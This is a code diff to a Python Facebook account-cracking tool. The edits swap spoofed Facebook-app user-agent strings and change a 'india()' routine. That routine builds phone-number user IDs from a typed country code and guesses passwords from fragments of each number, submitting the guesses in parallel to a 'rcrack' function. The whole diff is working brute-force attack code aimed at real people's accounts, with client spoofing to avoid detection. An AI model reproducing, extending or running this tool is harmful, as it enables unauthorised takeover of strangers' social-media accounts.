@@ -134,7 +134,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "[FBAN/FB4A;FBAV/425.0.0.3659;FBBV/5761929;FBDM/{density=3.0,width=1368,height=1502};FBLC/en_PK;FBRV/380687035;FBCR/Ufone;FBMF/RMX3960;FBBD/Realme;FBPN/com.facebook.lite;FBDV/RMX3960;FBSV/4;FBOP/5;FBCA/x86:armeabi-v7a;]"}
+header_grup = 'Dalvik/2.1.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/429.0.0.27.114;]'
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ###
@@ -240,7 +240,7 @@ url_lookup = "https://lookup-id.com/"
 url_mb = "https://x.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
 url_graph = "https://graph.facebook.com/{}"
-header_grup = {"user-agent": "[FBAN/FB4A;FBAV/400.0.0.2646;FBBV/2677851;FBDM/{density=1.7,width=1232,height=2519};FBLC/en_PK;FBRV/559479523;FBCR/Telenor;FBMF/RMX7270;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX7270;FBSV/7;FBOP/3;FBCA/x86:armeabi-v7a;]"}
+header_grup = 'Dalvik/2.1.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/429.0.0.27.114;]'
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
@@ -589,7 +589,7 @@ url_ip = "https://www.httpbin.org/ip"
 
 url_graph = "https://graph.facebook.com/{}"
 
-header_grup = {"user-agent": "[FBAN/FB4A;FBAV/416.0.0.3139;FBBV/5894007;FBDM/{density=3.8,width=1246,height=2510};FBLC/en_PK;FBRV/426515505;FBCR/Ufone;FBMF/RMX5728;FBBD/Realme;FBPN/com.facebook.lite;FBDV/RMX5728;FBSV/3;FBOP/2;FBCA/x86:armeabi-v7a;]"}
+header_grup = 'Dalvik/2.1.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/429.0.0.27.114;]'
 
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
@@ -1084,9 +1084,9 @@ def india():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('\033[1;31m[•] NOT : PUT 977,978,990,663,667,778 etc')
+	print('\033[1;31m[•] NOT : PUT 977,978,990,663,667,778etc')
 	linex()
-	kode = input('\033[1;37m[•] Put  Your Country Code: ')
+	kode = input('[+]\033[1;36m Put  Your Country Code: ')
 	os.system('clear')
 	print(logo)
 	limit = int(input('[+] Your Idz lemit : '))
@@ -1099,14 +1099,12 @@ def india():
 		print(logo)
 		tl = str(len(uid))
 		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+code)
+		print('[•] Selected Code : \x1b[1;92m'+kode)
 		print('\x1b[1;91m[•] If you no result use flight mode')
 		linex()
 		for guru in uid:
 			uid = '+91'+kode+guru
-			aj = uid[0:6]
-			aja = uid[0:8]
-			pwx = [guru,kode+guru,aj,aja]
+			pwx = [guru,kode+guru]
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(50*'-')
 	print('Crack process has been completed')
@@ -1249,7 +1247,7 @@ loop = 0
 
 ###USERAGENTSGEN####
 '''
-Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2555.106 Mobile Safari/537.36
+Dalvik/2.1.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/429.0.0.27.114;]
 
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
 andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
